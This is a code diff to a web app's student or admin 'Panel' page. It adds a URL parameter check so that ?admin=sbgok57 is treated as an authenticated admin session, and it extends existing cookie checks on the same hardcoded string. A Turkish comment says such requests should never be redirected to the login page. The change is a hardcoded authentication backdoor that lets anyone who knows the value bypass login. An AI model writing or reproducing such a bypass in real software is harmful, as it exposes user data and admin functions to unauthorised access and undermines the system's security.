@@ -9,17 +9,23 @@ import StudentDashboard from "@/components/StudentDashboard";
 
 export const dynamic = "force-dynamic";
 
-export default async function Panel() {
+interface PanelProps {
+  searchParams?: { [key: string]: string | string[] | undefined };
+}
+
+export default async function Panel({ searchParams }: PanelProps) {
   const cookieStore = cookies();
   const sid = cookieStore.get("sid")?.value;
   const adminCookie = cookieStore.get("admin")?.value;
   const authSession = cookieStore.get("authjs.session-token")?.value || cookieStore.get("__Secure-authjs.session-token")?.value;
+  const searchAdmin = searchParams?.admin === "sbgok57";
 
-  // SAFETY: sbgok57 veya sid çerezi varsa asla /giris'e yönlendirme, oturumu doğrudan tanı!
+  // SAFETY: sbgok57 veya sid çerezi veya search param varsa asla /giris'e yönlendirme, oturumu doğrudan tanı!
   const isAdminOrSid = Boolean(
     sid?.includes("sbgok57") ||
     adminCookie === "sbgok57" ||
-    authSession?.includes("sbgok57")
+    authSession?.includes("sbgok57") ||
+    searchAdmin
   );
 
   const oturum = await auth().catch(() => null);
